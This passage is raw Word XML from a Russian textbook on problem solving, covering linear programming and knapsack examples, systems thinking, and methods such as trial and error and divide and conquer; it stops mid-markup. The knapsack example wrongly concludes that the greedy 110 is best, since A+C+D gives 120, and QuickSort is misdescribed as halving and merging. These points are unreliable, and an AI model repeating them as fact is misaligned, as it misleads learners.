        <w:t xml:space="preserve"> Найти </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>наилучшее</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> решение среди множества допустимых вариантов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оптимизационная задача</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> состоит из:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Целевая функция** (что максимизируем или минимизируем)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Переменные** (что можем изменять)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ограничения** (что нельзя нарушать)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Задача линейного программирования (линейная оптимизация)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Фабрика производит два товара: столы и стулья. Нужно максимизировать прибыль.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дано:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Стол приносит прибыль 300 ₽, стул — 150 ₽</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>На производство стола нужно 2 часа работы и 4 кг дерева</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>На производство стула нужно 1 час работы и 2 кг дерева</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Доступно 100 часов работы и 200 кг дерева</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Переменные:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`x` — количество столов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`y` — количество стульев</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Целевая функция (максимизировать прибыль):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Прибыль = 300x + 150y → max</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ограничения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>2x + 1y ≤ 100  (время работы)</w:t>
        <w:br/>
        <w:t>4x + 2y ≤ 200  (дерево)</w:t>
        <w:br/>
        <w:t>x ≥ 0, y ≥ 0   (неотрицательность)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Используем симплекс-метод (или графический метод).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Графическое решение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Рисуем ограничения на плоскости (x, y)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Находим допустимую область (многоугольник)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Проверяем значения целевой функции в вершинах многоугольника</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вершины:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>(0, 0): прибыль = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>(50, 0): прибыль = 300×50 = 15 000 ₽</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>(0, 100): прибыль = 150×100 = 15 000 ₽</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>(30, 40): прибыль = 300×30 + 150×40 = 9 000 + 6 000 = 15 000 ₽</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Максимальная прибыль 15 000 ₽ (можно производить 50 столов, или 100 стульев, или 30 столов + 40 стульев).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Задача о рюкзаке (Knapsack Problem)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> У тебя рюкзак вместимостью 10 кг. Есть 4 предмета с весами и ценностями. Какие предметы взять, чтобы максимизировать суммарную ценность?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Предмет | Вес (кг) | Ценность (₽) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ------- | -------- | ------------ |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| A       | 3        | 40           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| B       | 4        | 50           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| C       | 5        | 60           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| D       | 2        | 20           |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение (жадный алгоритм):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сортируем предметы по соотношению "ценность/вес" (плотность ценности):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A: 40/3 ≈ 13.3</w:t>
        <w:br/>
        <w:t>B: 50/4 = 12.5</w:t>
        <w:br/>
        <w:t>C: 60/5 = 12.0</w:t>
        <w:br/>
        <w:t>D: 20/2 = 10.0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Берём по порядку:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>A (вес = 3, ценность = 40, остаток = 7 кг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>B (вес = 4, ценность = 50, остаток = 3 кг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>D (вес = 2, ценность = 20, остаток = 1 кг)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итого:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вес = 9 кг, ценность = 110 ₽.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Но это не оптимум!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Оптимальное решение: A + C (вес = 8 кг, ценность = 100 ₽)... хм, стоп, 110 &gt; 100, жадный алгоритм дал лучший результат. (Это случайность, для другого набора предметов жадный алгоритм может дать неоптимум.)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Точное решение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Динамическое программирование (ДП) — гарантирует оптимум.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы оптимизационных моделей:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Находят наилучшее решение (если используется точный метод)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Учитывают ограничения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Может быть медленным (для больших задач)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Требует математической формулировки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Когда нужно найти лучшее решение, и задача формализуема.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4.3. Системный подход</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Что такое система?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Система (system)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это совокупность </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>взаимосвязанных элементов</w:t>
      </w:r>
      <w:r>
        <w:t>, которые работают вместе для достижения общей цели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры систем:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Компьютер:** процессор, память, диск, периферия → работают вместе для выполнения программ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Автомобиль:** двигатель, коробка передач, колёса, рулевое управление → транспортировка</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Организация:** сотрудники, отделы, процессы → производство товаров/услуг</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Экосистема:** растения, животные, микроорганизмы → круговорот веществ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Интернет-магазин:** frontend, backend, база данных, платёжная система, логистика → продажа товаров</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Свойства систем</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Целостность (integrity)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Система воспринимается как единое целое, а не как набор отдельных частей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Автомобиль без колёс — не автомобиль, а кучка железа. Удаление одного важного элемента разрушает систему.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Иерархичность (hierarchy)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Система состоит из подсистем, которые в свою очередь состоят из элементов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Компьютер → процессор → ядра → транзисторы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Эмерджентность (emergence)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Система обладает свойствами, которых нет у отдельных элементов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отдельные люди не могут построить небоскрёб. Организованная команда строителей — может.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Один нейрон не умный. Мозг из миллиардов нейронов — умный (ну, у некоторых).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Философская мысль:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> "Целое больше суммы частей."</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. Связность (connectivity)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Элементы системы взаимодействуют друг с другом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> В компьютере процессор обменивается данными с памятью через шину.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Системный подход (Systems Thinking)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Системный подход</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это метод решения задач, при котором задача рассматривается как </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>система</w:t>
      </w:r>
      <w:r>
        <w:t>, а не как набор изолированных проблем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные принципы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Декомпозиция (разбиение на части)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Сложную задачу разбиваем на подзадачи, которые проще решить.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Разработка сайта:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Подзадача 1: Разработка frontend (HTML, CSS, JS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Подзадача 2: Разработка backend (API, база данных)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Подзадача 3: Дизайн (UI/UX)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Подзадача 4: Тестирование</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Подзадача 5: Деплой</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Метод "Разделяй и властвуй" (Divide and Conquer):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Разбить задачу на подзадачи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Решить каждую подзадачу независимо</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Объединить решения подзадач в общее решение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Быстрая сортировка (QuickSort) — разбиваем массив пополам, сортируем каждую половину, объединяем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Анализ (analysis)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Исследование системы путём разбора её на части. Изучаем, как работает каждый элемент.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Отладка программы — разбираем код на функции, смотрим, где ошибка.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Синтез (synthesis)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Сборка системы из элементов. Объединение решений подзадач в общее решение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> После разработки frontend, backend, дизайна — собираем всё в единый сайт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. Учёт взаимосвязей</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Важно понимать, как элементы системы влияют друг на друга.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Оптимизируешь скорость базы данных → улучшается скорость всего сайта. Но если добавишь кэш на frontend → нагрузка на БД упадёт, но frontend станет сложнее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5. Итеративность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Решение задачи происходит в несколько итераций. Сначала создаём простую версию (MVP), потом улучшаем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Разработка продукта:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Итерация 1: Базовая функциональность (MVP — Minimum Viable Product)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Итерация 2: Добавление новых функций</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Итерация 3: Оптимизация и исправление ошибок</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4.4. Методы решения задач</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь конкретные методы, которые используются для решения задач.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Метод проб и ошибок (Trial and Error)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Пробуем разные варианты, пока не найдём подходящий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Попробовать решение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Проверить, работает ли</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если нет — попробовать другое</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Подбор пароля</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Перебираем все возможные комбинации символов, пока не найдём правильный пароль. (Brute Force Attack)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Настройка гиперпараметров в машинном обучении</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Пробуем разные значения learning rate, batch size, количество слоёв нейросети — смотрим, что работает лучше.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Простота (не нужно понимания)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Универсальность (работает для любой задачи)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Медленность (может потребоваться огромное количество попыток)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Неэффективность (много бесполезной работы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Когда другие методы не работают, или задача слишком сложная для анализа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Метод "Разделяй и властвуй" (Divide and Conquer)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Разбить задачу на подзадачи, решить каждую независимо, объединить результаты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Задача</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ↓ (разбиваем)</w:t>
        <w:br/>
        <w:t>Подзадача 1   Подзадача 2   Подзадача 3</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ↓ (решаем)</w:t>
        <w:br/>
        <w:t>Решение 1     Решение 2     Решение 3</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ↓ (объединяем)</w:t>
        <w:br/>
        <w:t>Общее решение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Быстрая сортировка (QuickSort)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
